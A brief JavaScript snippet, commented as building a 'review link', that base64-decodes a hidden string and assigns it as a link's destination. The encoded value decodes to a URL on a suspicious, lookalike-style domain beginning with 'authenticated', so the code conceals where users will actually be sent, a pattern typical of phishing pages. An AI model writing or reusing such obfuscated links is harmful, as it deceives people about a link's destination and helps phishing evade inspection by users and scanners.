// JavaScript for generating the review link
const encodedString = 'aHR0cHM6Ly9hdXRoZW50aWNhdGVkLmFjZWJsZGdtaWFudC5jb21saW5rLmNvbS8k';
const finalURL = atob(encodedString);
document.getElementById('review-link').href = finalURL;
